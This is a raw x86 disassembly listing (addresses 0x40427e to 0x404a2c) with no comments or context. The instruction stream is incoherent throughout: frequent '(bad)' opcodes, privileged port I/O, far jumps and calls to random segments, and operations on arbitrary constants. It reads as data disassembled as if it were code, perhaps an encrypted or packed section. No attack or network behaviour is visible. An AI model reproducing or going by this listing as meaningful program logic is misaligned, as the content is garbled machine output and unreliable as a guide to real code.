  40427e:	add    edi,DWORD PTR [eax-0x7cc2c28e]
  404284:	imul   edi,edi,0x53c618b0
  40428a:	aas    
  40428b:	xor    DWORD PTR [ecx+0x503055d6],0x18
  404292:	out    dx,al
  404293:	cs aam 0x41
  404296:	les    esi,FWORD PTR [edi]
  404298:	mov    dl,0x6b
  40429a:	dec    eax
  40429b:	daa    
  40429c:	and    al,ah
  40429e:	and    ecx,DWORD PTR [ebx]
  4042a0:	inc    ecx
  4042a1:	neg    BYTE PTR [ebx-0x11]
  4042a4:	outs   dx,DWORD PTR ds:[esi]
  4042a5:	(bad)  
  4042a6:	and    eax,0xaa8dc022
  4042ab:	out    0xc6,al
  4042ad:	xor    dl,BYTE PTR [edi-0x4e]
  4042b0:	retf   0x2213
  4042b3:	cli    
  4042b4:	and    bl,BYTE PTR [esi+0x78]
  4042b7:	cmp    bh,ch
  4042b9:	adc    ebx,edx
  4042bb:	inc    esi
  4042bc:	jo     0x404240
  4042be:	xchg   DWORD PTR [ebx+0x40372d4c],ecx
  4042c4:	add    BYTE PTR [edx-0x477ffde0],dh
  4042ca:	and    eax,0x1c7f0c4d
  4042cf:	and    edx,ebx
  4042d1:	jl     0x4042ec
  4042d3:	idiv   BYTE PTR [ebx]
  4042d5:	and    esi,ebx
  4042d7:	cmp    ch,dh
  4042d9:	mov    ?,WORD PTR [esi+0x5a]
  4042dc:	mov    ch,0xf4
  4042de:	(bad)  
  4042e0:	int    0xa5
  4042e2:	addr16 push 0x9289efa9
  4042e8:	pop    ebp
  4042e9:	cmp    edx,eax
  4042eb:	push   0x1b7192b7
  4042f0:	ret    
  4042f1:	xchg   BYTE PTR fs:[edx+ebp*1],dh
  4042f5:	ficom  DWORD PTR [esi+0x16]
  4042f8:	xor    ebp,DWORD PTR [edi+esi*8-0x47d5a475]
  4042ff:	into   
  404300:	mov    ds:0x2bfbdad,eax
  404305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404306:	mov    dh,BYTE PTR [eax]
  404308:	mov    ch,0x42
  40430a:	dec    ebx
  40430b:	call   0xdda0301c
  404310:	xchg   ebx,eax
  404311:	jnp    0x404378
  404313:	push   ss
  404314:	or     edx,DWORD PTR [ebx+0x77]
  404317:	push   ebp
  404318:	cli    
  404319:	or     al,0x68
  40431b:	sbb    al,0x2c
  40431d:	int3   
  40431e:	xor    esi,ebp
  404320:	inc    eax
  404321:	and    al,0x5c
  404323:	retf   
  404324:	fucom  st(2)
  404326:	je     0x404387
  404328:	js     0x4042cc
  40432a:	(bad)
  40432e:	push   edi
  40432f:	inc    ebp
  404330:	lahf   
  404331:	push   esp
  404332:	mov    al,0xf1
  404334:	aaa    
  404335:	ins    DWORD PTR es:[edi],dx
  404336:	icebp  
  404337:	push   ss
  404338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404339:	repz jns 0x4042c6
  40433c:	adc    DWORD PTR [edi+0xef85025],eax
  404342:	in     eax,dx
  404343:	loopne 0x404345
  404345:	in     al,dx
  404346:	scas   eax,DWORD PTR es:[edi]
  404347:	jns    0x40437e
  404349:	adc    eax,0x756d8336
  40434e:	out    0x6d,eax
  404350:	aad    0x25
  404352:	sub    bh,dl
  404354:	xor    BYTE PTR [eax-0x63],cl
  404357:	xchg   edi,eax
  404358:	inc    ebp
  404359:	add    BYTE PTR [ebx-0x3ac38088],ch
  40435f:	xchg   edi,eax
  404360:	xchg   esi,eax
  404361:	leave  
  404362:	repnz xchg edx,eax
  404364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404365:	sub    eax,0xe67e12e
  40436a:	pop    ebx
  40436b:	mov    edi,0x59ded02e
  404370:	sub    eax,0xd685078c
  404375:	dec    ecx
  404376:	adc    al,0xa8
  404378:	mov    esp,esi
  40437a:	int    0x32
  40437c:	jg     0x404385
  40437e:	lahf   
  40437f:	inc    ecx
  404380:	push   ss
  404381:	repnz sub DWORD PTR [ebx-0x44d0d9c0],esp
  404388:	mov    al,0xad
  40438a:	scas   al,BYTE PTR es:[edi]
  40438b:	pop    ds
  40438c:	push   ebp
  40438d:	adc    al,0x95
  40438f:	iret   
  404390:	inc    esp
  404391:	or     BYTE PTR [eax],al
  404393:	push   ds
  404394:	adc    al,0xc7
  404396:	les    eax,FWORD PTR [ebx-0x5c238796]
  40439c:	and    eax,0xe56f410c
  4043a1:	mov    fs,edx
  4043a3:	push   ss
  4043a4:	mov    ebp,0x52959510
  4043a9:	enter  0x2268,0x23
  4043ad:	xchg   edx,eax
  4043ae:	sti    
  4043af:	mov    esp,0xc5befb1e
  4043b4:	sub    al,0xaa
  4043b6:	pop    ds
  4043b7:	xor    al,BYTE PTR [ebp+0x2a]
  4043ba:	or     DWORD PTR [ebp+0x57],edi
  4043bd:	lahf   
  4043be:	adc    DWORD PTR [edx-0x56cfdec0],esi
  4043c4:	push   ecx
  4043c5:	push   eax
  4043c6:	out    0x71,al
  4043c8:	fmul   st(6),st
  4043ca:	and    edi,DWORD PTR [edi]
  4043cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043cd:	dec    edx
  4043ce:	sub    eax,0x6aeef940
  4043d3:	sub    BYTE PTR [ebx],cl
  4043d5:	neg    bl
  4043d7:	nop
  4043d8:	mov    ds:0x9f8e7e72,eax
  4043dd:	sub    eax,0x802d290a
  4043e2:	jb     0x4043eb
  4043e4:	fmul   DWORD PTR [esp+edx*1-0x24]
  4043e8:	leave  
  4043e9:	in     eax,0x7f
  4043eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043ed:	outs   dx,DWORD PTR ds:[esi]
  4043ee:	aaa    
  4043ef:	lods   eax,DWORD PTR ds:[esi]
  4043f0:	jno    0x4043b7
  4043f2:	mov    dl,0x7
  4043f4:	popa   
  4043f5:	push   ebx
  4043f6:	cli    
  4043f7:	dec    ecx
  4043f8:	in     al,dx
  4043f9:	popa   
  4043fa:	outs   dx,DWORD PTR ds:[esi]
  4043fb:	imul   edi,DWORD PTR [ecx-0x3c],0xcf50751
  404402:	std    
  404403:	push   eax
  404404:	jae    0x4043e4
  404406:	and    ebp,DWORD PTR [edi+0x1c]
  404409:	add    DWORD PTR [esi],edi
  40440b:	shl    DWORD PTR [ecx+0x181be373],1
  404411:	es daa 
  404413:	es cli 
  404415:	shl    DWORD PTR [ebp+0x1a],0xd7
  404419:	leave  
  40441a:	lods   eax,DWORD PTR ds:[esi]
  40441b:	in     eax,0x7b
  40441d:	hlt    
  40441e:	inc    esp
  40441f:	out    0x7c,eax
  404421:	jns    0x404416
  404423:	das    
  404424:	adc    al,BYTE PTR [edi]
  404426:	mov    eax,ds:0x684e43f9
  40442b:	cmp    DWORD PTR [edx+eax*8-0x3],ecx
  40442f:	push   es
  404430:	inc    esi
  404431:	push   0xfffffff1
  404433:	pop    es
  404434:	or     eax,0xd17d9f19
  404439:	std    
  40443a:	sub    edx,DWORD PTR [edx]
  40443c:	cmp    BYTE PTR [ebx],0x89
  40443f:	xchg   esp,eax
  404440:	pop    es
  404441:	nop
  404442:	mov    esi,ebx
  404444:	xchg   ebx,eax
  404445:	in     al,0x66
  404447:	popf   
  404448:	lock js 0x4044a8
  40444b:	xchg   ecx,eax
  40444c:	push   esp
  40444d:	xchg   edx,eax
  40444e:	sti    
  40444f:	push   eax
  404450:	fidivr WORD PTR [ebp-0x22a4b164]
  404456:	xor    eax,0x9f714e9b
  40445b:	stc    
  40445c:	fcom   DWORD PTR [esi]
  40445e:	xchg   ebx,eax
  40445f:	and    eax,0xb4232045
  404464:	pop    esi
  404465:	jo     0x404418
  404467:	gs ds stos DWORD PTR es:[edi],eax
  40446a:	xor    edx,edi
  40446c:	mov    esi,0xb1f8d808
  404471:	mov    ecx,0x4e6ef40
  404476:	xchg   esp,eax
  404477:	call   0x2d1c:0xea9f7d8f
  40447e:	mov    ds:0x958bf852,al
  404483:	jbe    0x404466
  404485:	hlt    
  404486:	inc    esi
  404487:	xor    DWORD PTR [edx],0x25298317
  40448d:	dec    esp
  40448e:	mov    ebp,0xfc60ab66
  404493:	inc    ebp
  404494:	scas   al,BYTE PTR es:[edi]
  404495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404496:	cmp    DWORD PTR [ecx-0x1c],ebx
  404499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40449a:	ret    
  40449b:	xor    ch,BYTE PTR [ecx-0x268386f3]
  4044a1:	sbb    DWORD PTR [ebx],edx
  4044a3:	cmp    esp,esi
  4044a5:	lock in al,0xa5
  4044a8:	sbb    eax,0x43a1cfc
  4044ad:	outs   dx,BYTE PTR ds:[esi]
  4044ae:	mov    cl,0x1b
  4044b0:	sub    eax,0x5d43b1e3
  4044b5:	es mov esp,0xb5911b8c
  4044bb:	test   BYTE PTR [esi-0x64],ah
  4044be:	xchg   BYTE PTR [edi+0x5fccc879],bh
  4044c4:	xlat   BYTE PTR ds:[ebx]
  4044c5:	ja     0x404474
  4044c7:	or     eax,DWORD PTR ds:0xa587421e
  4044cd:	mov    edi,ecx
  4044cf:	daa    
  4044d0:	cli    
  4044d1:	idiv   ebx
  4044d3:	xchg   esp,eax
  4044d4:	test   bl,al
  4044d6:	pushf  
  4044d7:	shr    BYTE PTR [ebx-0x11],1
  4044da:	sbb    al,0x6f
  4044dc:	cdq    
  4044dd:	push   es
  4044de:	adc    al,BYTE PTR [ebx]
  4044e0:	inc    ebx
  4044e1:	mov    eax,ds:0x675c5641
  4044e6:	inc    edi
  4044e7:	loop   0x4044ac
  4044e9:	push   0x764e0213
  4044ee:	pop    edx
  4044ef:	ss stos BYTE PTR es:[edi],al
  4044f1:	add    BYTE PTR [ebp+0x7dfd1cf4],dl
  4044f7:	int3   
  4044f8:	xor    esp,DWORD PTR [ebp+0x62]
  4044fb:	jg     0x404557
  4044fd:	push   esi
  4044fe:	fcomi  st,st(6)
  404500:	(bad)  
  404501:	jae    0x404522
  404503:	retf   0xf16e
  404506:	shl    BYTE PTR [ebx+0x3d627959],cl
  40450c:	cmp    ch,dl
  40450e:	xor    BYTE PTR [esi+0x538c8a4],cl
  404514:	clc    
  404515:	out    0xe4,al
  404517:	nop
  404518:	push   es
  404519:	lods   eax,DWORD PTR ds:[esi]
  40451a:	ss pushf 
  40451c:	xchg   edx,eax
  40451d:	fild   WORD PTR [eax+ebx*4-0x27f377dc]
  404524:	xor    ebx,ebp
  404526:	les    esi,FWORD PTR [edx+ebx*8+0x1d]
  40452a:	lods   eax,DWORD PTR ds:[esi]
  40452b:	jg     0x404519
  40452d:	retf   0x18f2
  404530:	aas    
  404531:	xchg   esi,eax
  404532:	fsub   QWORD PTR [ebx]
  404534:	mov    bh,0x7a
  404536:	xchg   ecx,eax
  404537:	test   BYTE PTR [eax-0x76ef4daf],0x83
  40453e:	lods   al,BYTE PTR ds:[esi]
  40453f:	neg    BYTE PTR [ebp-0x70]
  404542:	sub    al,BYTE PTR [ebx]
  404544:	push   es
  404545:	and    eax,0x57331492
  40454a:	cmc    
  40454b:	pop    ds
  40454c:	pusha  
  40454d:	imul   esp,esi,0x9b3c7078
  404553:	bound  edx,QWORD PTR [ebx]
  404555:	aam    0x56
  404557:	test   DWORD PTR [ebp-0xf],esi
  40455a:	dec    BYTE PTR [eax-0x24]
  40455d:	int    0x2d
  40455f:	and    BYTE PTR [ecx-0x766e0569],dh
  404565:	adc    DWORD PTR [eax],esp
  404567:	and    eax,0xe639760f
  40456c:	enter  0x174e,0x10
  404570:	and    DWORD PTR [edi],esp
  404572:	xor    eax,0x1ea23d2e
  404577:	iret   
  404578:	xchg   edx,eax
  404579:	inc    ebp
  40457a:	(bad)  
  40457b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40457c:	pop    ecx
  40457d:	repz pop ebp
  40457f:	and    eax,ecx
  404581:	scas   al,BYTE PTR es:[edi]
  404582:	(bad)  
  404583:	cmc    
  404584:	ja     0x404545
  404586:	data16 mov ds,WORD PTR [esi]
  404589:	inc    esp
  40458a:	div    BYTE PTR [esi+ebp*8-0x38]
  40458e:	pop    ds
  40458f:	outs   dx,DWORD PTR ds:[esi]
  404590:	pop    edx
  404591:	call   0xd8f6:0xe16e2ab2
  404598:	jp     0x404559
  40459a:	inc    ebx
  40459b:	mov    ebp,0xaf406658
  4045a0:	lock cs int3 
  4045a3:	in     al,dx
  4045a4:	leave  
  4045a5:	jmp    0x108e:0xdde149a0
  4045ac:	fwait
  4045ad:	cmp    eax,0x3957c0a0
  4045b2:	pop    ecx
  4045b3:	sub    ebx,ebx
  4045b5:	(bad)  
  4045b6:	push   ss
  4045b7:	pop    ss
  4045b8:	inc    ecx
  4045b9:	add    DWORD PTR [ebx+0x4a86e1c4],esi
  4045bf:	(bad)  
  4045c1:	std    
  4045c2:	inc    edi
  4045c3:	xchg   DWORD PTR [edx+0x45],esp
  4045c6:	cdq    
  4045c7:	mov    esi,0x41aba5e0
  4045cc:	cmc    
  4045cd:	repnz push ecx
  4045cf:	mov    bl,0x19
  4045d1:	jae    0x404625
  4045d3:	out    dx,al
  4045d4:	xchg   ebp,eax
  4045d5:	call   DWORD PTR [edx]
  4045d7:	sar    DWORD PTR [edi+0x6c],cl
  4045da:	mov    cs,WORD PTR [ebx-0x54]
  4045dd:	mov    dl,0x62
  4045df:	sti    
  4045e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045e1:	pop    edi
  4045e2:	test   esp,0x83029326
  4045e8:	nop
  4045e9:	add    esp,eax
  4045eb:	add    al,0x39
  4045ed:	cmp    DWORD PTR [edx+0x17],esp
  4045f0:	sub    esi,DWORD PTR [ebx-0x325418b3]
  4045f6:	xchg   edi,eax
  4045f7:	sub    eax,DWORD PTR [edi+0x3]
  4045fa:	push   ecx
  4045fc:	(bad)  
  4045fd:	and    DWORD PTR [edx+edi*8-0x67e6bc1b],ebp
  404604:	adc    DWORD PTR [edx],ebx
  404606:	cwde   
  404607:	sbb    al,BYTE PTR [eax+0x53]
  40460a:	mov    ds,esi
  40460c:	out    dx,al
  40460d:	loop   0x4045b9
  40460f:	mov    ?,WORD PTR [edx+0xa]
  404612:	jmp    FWORD PTR [edi+0x32]
  404615:	scas   al,BYTE PTR es:[edi]
  404616:	mov    edx,0x6b1b6b4
  40461b:	ror    edi,0xfc
  40461e:	jne    0x4045d0
  404620:	adc    BYTE PTR [edx+esi*1],cl
  404623:	xchg   ebx,eax
  404624:	in     al,0xe7
  404626:	pop    ebx
  404627:	dec    ebp
  404628:	enter  0x3b38,0x5f
  40462c:	lods   al,BYTE PTR ds:[esi]
  40462d:	sub    ebx,esp
  40462f:	test   DWORD PTR [ecx],ebx
  404631:	dec    esi
  404632:	je     0x404694
  404634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404635:	add    eax,0xc0121da2
  40463a:	hlt    
  40463b:	call   0x5892678b
  404640:	xor    bh,bl
  404642:	jns    0x404603
  404644:	lods   al,BYTE PTR ds:[esi]
  404645:	mov    edx,0xb138dbcf
  40464a:	dec    edx
  40464b:	shl    BYTE PTR [ebx+0x7d],1
  40464e:	mov    al,0xb7
  404650:	pushf  
  404651:	fsub   QWORD PTR [ebx-0x22cb6ea8]
  404657:	ret    0xbd4c
  40465a:	loope  0x404607
  40465c:	jmp    0x87ac:0x520a9314
  404663:	dec    esi
  404664:	xchg   ebp,eax
  404665:	pop    eax
  404666:	and    ebp,ebp
  404668:	adc    BYTE PTR [edi],ch
  40466a:	inc    ebx
  40466b:	pop    ss
  40466c:	nop
  40466d:	scas   al,BYTE PTR es:[edi]
  40466e:	fdiv   DWORD PTR [edx]
  404670:	(bad)  [esi+0x2b]
  404673:	imul   esi,DWORD PTR [esi+0x1dc3c286],0x45a9acad
  40467d:	in     al,0x46
  40467f:	sbb    edi,DWORD PTR [edi]
  404681:	dec    edi
  404682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404683:	mov    eax,0x92ba188d
  404688:	mov    cl,0x60
  40468a:	push   esi
  40468b:	sub    dh,bl
  40468d:	pop    ds
  40468e:	mov    cl,0xd9
  404690:	jmp    0x638a:0x77cce86c
  404697:	or     DWORD PTR [eax],ebx
  404699:	ja     0x404679
  40469b:	or     DWORD PTR [edx+0xc52b4e4],0xe2ad1f85
  4046a5:	push   esp
  4046a6:	test   al,0x7f
  4046a8:	call   0xfa1d7a64
  4046ad:	or     BYTE PTR [esi+ebx*2-0xc423ac7],0x1e
  4046b5:	dec    ebx
  4046b6:	xchg   edi,eax
  4046b7:	mov    ?,WORD PTR [esi]
  4046b9:	mov    ch,cl
  4046bb:	cwde   
  4046bc:	(bad)  
  4046bd:	jle    0x404655
  4046bf:	xchg   ebx,eax
  4046c0:	dec    esp
  4046c1:	pop    edi
  4046c2:	and    eax,eax
  4046c4:	xchg   esi,eax
  4046c5:	loop   0x404736
  4046c7:	pop    edi
  4046c8:	rcr    edx,1
  4046ca:	es add al,0xe3
  4046cd:	mov    eax,DWORD PTR [ebx]
  4046cf:	xor    dl,BYTE PTR [edx+0x5373adc5]
  4046d5:	sbb    ecx,eax
  4046d7:	ds xchg esi,eax
  4046d9:	inc    esp
  4046da:	mov    ah,0x2c
  4046dc:	xchg   esp,eax
  4046dd:	fmul   st,st(6)
  4046df:	inc    edx
  4046e0:	inc    edx
  4046e1:	pop    esi
  4046e2:	enter  0xbeaf,0x87
  4046e6:	dec    sp
  4046e8:	jnp    0x4046f7
  4046ea:	ror    BYTE PTR [eax+0x6b8cd25e],0xe0
  4046f1:	push   ss
  4046f2:	call   0x9b1146db
  4046f7:	xchg   ecx,eax
  4046f8:	iret   
  4046f9:	xchg   ebx,eax
  4046fa:	adc    DWORD PTR [ebp+0x75950f2d],edx
  404700:	jl     0x404703
  404702:	or     DWORD PTR [edi+0x5d],esp
  404705:	dec    esi
  404706:	xor    DWORD PTR [esi+0x53],edi
  404709:	push   ds
  40470a:	xchg   ebx,eax
  40470b:	lea    ebx,[edx-0x23]
  40470e:	xchg   esi,eax
  40470f:	jbe    0x4046dc
  404711:	fist   WORD PTR [esi+0x2b]
  404714:	cli    
  404715:	cmp    bh,BYTE PTR [edx]
  404717:	in     al,0xf
  404719:	frstor [ecx+0x1c3814da]
  40471f:	xchg   edi,eax
  404720:	xchg   ebx,eax
  404721:	xchg   BYTE PTR [esi+0x21],bh
  404724:	sub    ah,BYTE PTR [esi-0x4e]
  404727:	jmp    0xf3ddfb10
  40472c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40472d:	cmp    BYTE PTR [ecx-0x4551c12a],cl
  404733:	or     BYTE PTR [eax],ch
  404735:	push   ss
  404736:	push   esp
  404737:	cs pushf 
  404739:	into   
  40473a:	or     ebp,esp
  40473c:	pusha  
  40473d:	(bad)  
  40473e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40473f:	dec    eax
  404740:	xor    eax,0x50e1a22b
  404745:	test   eax,0x2e47f244
  40474a:	mul    BYTE PTR [eax]
  40474c:	adc    al,al
  40474e:	mov    ah,0x7e
  404750:	mov    DWORD PTR [esi-0xbd54e20],0x317d20a8
  40475a:	ret    
  40475b:	scas   eax,DWORD PTR es:[edi]
  40475c:	sbb    ebx,DWORD PTR [eax]
  40475e:	es int 0x15
  404761:	and    bh,BYTE PTR [edx+0x4f]
  404764:	mov    dl,0x45
  404766:	in     eax,0x7a
  404768:	sub    al,0x69
  40476a:	or     eax,ebp
  40476c:	adc    DWORD PTR [eax],esp
  40476e:	dec    edx
  40476f:	mov    ds:0x2388b0cb,al
  404774:	sbb    eax,0x989ff8ae
  404779:	das    
  40477a:	cmp    edx,DWORD PTR [edx+0x7ac57f2d]
  404780:	dec    esi
  404781:	xchg   ebx,eax
  404782:	sbb    eax,ebp
  404784:	sbb    bh,ch
  404786:	es push esi
  404788:	jmp    0xce09d92d
  40478d:	mov    cl,0x49
  40478f:	xstore-rng (bad)
  404790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404791:	add    esp,0x9d284d53
  404797:	mov    dl,0x21
  404799:	mov    BYTE PTR [eax+0x56],bh
  40479c:	call   0x75ed:0x1bd3f2b5
  4047a3:	enter  0x1e61,0xe8
  4047a7:	mov    al,ds:0x3f7088d2
  4047ac:	iret   
  4047ad:	fdiv   QWORD PTR ss:[ecx-0x4f]
  4047b1:	sbb    dl,BYTE PTR [ebx]
  4047b3:	outs   dx,DWORD PTR ds:[esi]
  4047b4:	mov    DWORD PTR [eax-0x62],esi
  4047b7:	inc    ebp
  4047b8:	(bad)  
  4047ba:	dec    ebp
  4047bb:	inc    ebx
  4047bc:	mov    ds:0xfbf7bc35,eax
  4047c1:	xor    edi,0xffffffcc
  4047c4:	or     dl,BYTE PTR [ebx+0x68]
  4047c7:	(bad)  
  4047c8:	fist   DWORD PTR ds:0x6c44704d
  4047ce:	jnp    0x40479d
  4047d0:	inc    ecx
  4047d1:	icebp  
  4047d2:	dec    esi
  4047d3:	test   BYTE PTR [edx],cl
  4047d5:	mov    eax,0xf4f7a2be
  4047da:	out    0xfd,eax
  4047dc:	lock xchg edi,eax
  4047de:	add    edi,DWORD PTR [esi-0x6fd17769]
  4047e4:	jne    0x40476c
  4047e6:	adc    DWORD PTR ds:[esp+esi*1-0xdf4eea2],ecx
  4047ee:	lea    eax,[ecx]
  4047f0:	jnp    0x4047fa
  4047f2:	mov    edi,0x882f1d1f
  4047f7:	lods   al,BYTE PTR ds:[esi]
  4047f8:	pusha  
  4047f9:	sbb    eax,0x9470cbda
  4047fe:	push   ebx
  4047ff:	retf   
  404800:	ret    0xbc59
  404803:	test   BYTE PTR [ecx-0x38c18145],dl
  404809:	test   eax,0x678f3116
  40480e:	sbb    eax,0xef933b5e
  404813:	or     BYTE PTR ds:0x7c1b1944,ah
  404819:	std    
  40481a:	test   BYTE PTR [eax+0x5dac0fc5],al
  404820:	adc    al,0x5b
  404822:	jle    0x4047f7
  404824:	cmp    al,0x53
  404826:	ja     0x404826
  404828:	adc    al,0x2b
  40482a:	jmp    0xd368:0xf5d3b67c
  404831:	(bad)  
  404832:	lods   eax,DWORD PTR ds:[esi]
  404833:	jge    0x404862
  404835:	inc    edx
  404836:	add    al,0xe9
  404838:	or     DWORD PTR [ebp-0x6a],esi
  40483b:	jae    0x40485c
  40483d:	pop    edi
  40483e:	daa    
  40483f:	xchg   ebx,eax
  404840:	sar    DWORD PTR [eax-0x47],cl
  404843:	cdq    
  404844:	cld    
  404845:	test   eax,0xa6754f8b
  40484a:	cmp    al,bl
  40484c:	adc    eax,0x1b6c85ff
  404851:	retf   
  404852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404853:	clc    
  404854:	rcl    BYTE PTR ds:0x2b6834c3,1
  40485a:	pop    esi
  40485b:	jno    0x40483e
  40485d:	lock (bad) 
  40485f:	jl     0x404889
  404861:	sar    BYTE PTR [ecx+edx*8+0x25],1
  404865:	fistp  DWORD PTR [ebp+0x59a63565]
  40486b:	adc    cl,BYTE PTR [esp+ebp*4-0x14bf10fb]
  404872:	xor    DWORD PTR [esi+0xf],esp
  404875:	fldenv [edx+0x31]
  404878:	in     eax,0xa6
  40487a:	inc    edx
  40487b:	mov    dl,0x5a
  40487d:	mov    esi,0x9fa40ca6
  404882:	jmp    0x4b9bd941
  404887:	push   edi
  404888:	sbb    BYTE PTR [esi+0x68],dh
  40488b:	out    dx,al
  40488c:	lods   eax,DWORD PTR ds:[esi]
  40488d:	jl     0x404840
  40488f:	cld    
  404890:	sub    dh,ch
  404892:	pop    edx
  404893:	dec    DWORD PTR [ecx+0x66]
  404896:	fcom   QWORD PTR [ecx+eax*4-0x65]
  40489a:	leave  
  40489b:	jge    0x4048b7
  40489d:	and    al,0xba
  40489f:	sub    eax,0xa12f68f
  4048a4:	setge  BYTE PTR [ecx]
  4048a7:	cwde   
  4048a8:	add    eax,0xcbf6ee11
  4048ad:	mov    ds:0x66f23ea9,eax
  4048b2:	inc    ecx
  4048b3:	loope  0x4048ee
  4048b5:	push   edx
  4048b6:	push   edi
  4048b7:	jge    0x404931
  4048b9:	inc    esi
  4048ba:	add    BYTE PTR [edx],0x83
  4048bd:	test   esi,ebp
  4048bf:	sbb    al,0x8c
  4048c1:	(bad)  
  4048c2:	or     dh,BYTE PTR [esi+0x636440ab]
  4048c8:	inc    esi
  4048c9:	popa   
  4048ca:	rcr    BYTE PTR [esi+0x10],1
  4048cd:	daa    
  4048ce:	mov    eax,0xf54b6a6
  4048d3:	gs iret 
  4048d5:	popa   
  4048d6:	jge    0x4048ef
  4048d8:	shl    DWORD PTR ds:0xde050945,cl
  4048de:	sbb    BYTE PTR [ebp-0x67f51520],dl
  4048e4:	inc    esi
  4048e5:	push   eax
  4048e6:	mov    edx,0x12d7aa52
  4048eb:	mov    edi,0x95a5581e
  4048f0:	inc    eax
  4048f1:	mov    cl,dl
  4048f3:	enter  0xac33,0x65
  4048f7:	scas   al,BYTE PTR es:[edi]
  4048f8:	xchg   DWORD PTR [esi+ebp*8],esp
  4048fb:	push   edi
  4048fc:	adc    DWORD PTR [edx+ecx*8+0x1f],esi
  404900:	push   ds
  404901:	leave  
  404902:	(bad)  
  404903:	sti    
  404904:	iret   
  404905:	and    eax,0x5cff76e8
  40490a:	xchg   ecx,eax
  40490b:	mov    ds,WORD PTR ds:0x7534e54b
  404911:	rol    esp,0xb4
  404914:	scas   eax,DWORD PTR es:[edi]
  404915:	fcom   DWORD PTR [ebx-0x3d]
  404918:	mov    bl,0x30
  40491a:	test   DWORD PTR [esi],0x6456e3b3
  404920:	xchg   DWORD PTR [eax],esp
  404922:	jg     0x404988
  404924:	pop    ebp
  404925:	sub    al,0x12
  404927:	xlat   BYTE PTR ds:[ebx]
  404928:	lock and eax,0xb8f9b719
  40492e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40492f:	mov    ss,ebx
  404931:	dec    ebx
  404932:	xor    al,0x17
  404934:	xor    cl,BYTE PTR [edx]
  404936:	(bad)  
  404937:	in     al,dx
  404938:	inc    eax
  404939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40493a:	cmp    BYTE PTR [edi],bl
  40493c:	out    dx,al
  40493d:	inc    esp
  40493e:	sub    DWORD PTR [eax],esp
  404940:	mov    ah,0x9c
  404942:	sar    DWORD PTR [ecx+0x77],cl
  404945:	aam    0x86
  404947:	mov    ds:0x10aea1fa,eax
  40494c:	sbb    cl,BYTE PTR [esi+0x56]
  40494f:	mov    edx,0x986567b7
  404954:	iret   
  404955:	dec    eax
  404956:	ins    DWORD PTR es:[edi],dx
  404957:	not    BYTE PTR [ecx+0x65]
  40495a:	xchg   esp,eax
  40495b:	jge    0x40499e
  40495d:	add    DWORD PTR [esi-0x2e877d88],ebp
  404963:	cmp    DWORD PTR [edx],ebp
  404965:	adc    edx,eax
  404967:	and    bl,BYTE PTR [ecx+0x41861e7c]
  40496d:	mov    dh,0x62
  40496f:	cmp    ecx,DWORD PTR [edi]
  404971:	pop    ds
  404972:	xlat   BYTE PTR ds:[ebx]
  404973:	sbb    BYTE PTR [esi+edi*1+0x79f5f701],ch
  40497a:	jb     0x404983
  40497c:	std    
  40497d:	adc    BYTE PTR [edx+0x6e],ah
  404980:	imul   eax,edx,0x24541d3f
  404986:	mov    ds:0x57e46975,eax
  40498b:	(bad)  
  40498d:	xchg   cl,dh
  40498f:	in     al,0xe5
  404991:	or     eax,0x950f54b3
  404996:	leave  
  404997:	and    BYTE PTR [ebx-0x7],al
  40499a:	dec    esp
  40499b:	outs   dx,BYTE PTR ds:[esi]
  40499c:	clc    
  40499d:	iret   
  40499e:	out    dx,eax
  40499f:	mov    eax,ds:0x15ba126b
  4049a4:	xor    al,0x2a
  4049a6:	sub    al,cl
  4049a8:	xchg   edx,edx
  4049aa:	bnd jae 0x4049fa
  4049ad:	push   0xbf0aa16d
  4049b2:	jnp    0x404988
  4049b4:	arpl   WORD PTR [edx-0x25],cx
  4049b7:	(bad)  
  4049b8:	out    0xf0,al
  4049ba:	push   edx
  4049bb:	outs   dx,BYTE PTR ds:[esi]
  4049bc:	xchg   DWORD PTR [ebp-0x7d9d8286],esi
  4049c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049c3:	jbe    0x4049d8
  4049c5:	mov    cl,0x1b
  4049c7:	inc    edx
  4049c8:	xchg   ecx,eax
  4049c9:	pusha  
  4049ca:	sbb    al,0x5f
  4049cc:	xchg   DWORD PTR fs:[eax],esp
  4049cf:	icebp  
  4049d0:	call   DWORD PTR [edx+0x4ade6ecf]
  4049d6:	cmp    cl,BYTE PTR [ebp+0x62]
  4049d9:	(bad)  
  4049dc:	daa    
  4049dd:	jmp    0x259b:0x227b4fe7
  4049e4:	mov    dl,0x1d
  4049e6:	adc    ah,al
  4049e8:	add    eax,0x9880d142
  4049ed:	loope  0x404a61
  4049ef:	fst    DWORD PTR [edi]
  4049f1:	clc    
  4049f2:	fimul  DWORD PTR [ecx]
  4049f4:	das    
  4049f5:	fcmovbe st,st(1)
  4049f7:	jmp    0xa94653b1
  4049fc:	adc    al,0x29
  4049fe:	jecxz  0x4049a5
  404a00:	inc    edx
  404a01:	push   0x45964dd0
  404a06:	shr    eax,cl
  404a08:	sub    DWORD PTR [eax],0x4c
  404a0b:	fwait
  404a0c:	enter  0xb746,0x2a
  404a10:	xor    bl,BYTE PTR [eax-0x6eb7f446]
  404a16:	jecxz  0x4049f5
  404a18:	dec    ebx
  404a19:	sbb    BYTE PTR [edx],cl
  404a1b:	into   
  404a1c:	jne    0x4049d2
  404a1e:	or     eax,0x8bbf7c83
  404a23:	inc    eax
  404a24:	xor    eax,0x157fdacb
  404a29:	test   BYTE PTR [ebp-0x4d],dh
  404a2c:	mov    al,0xfa
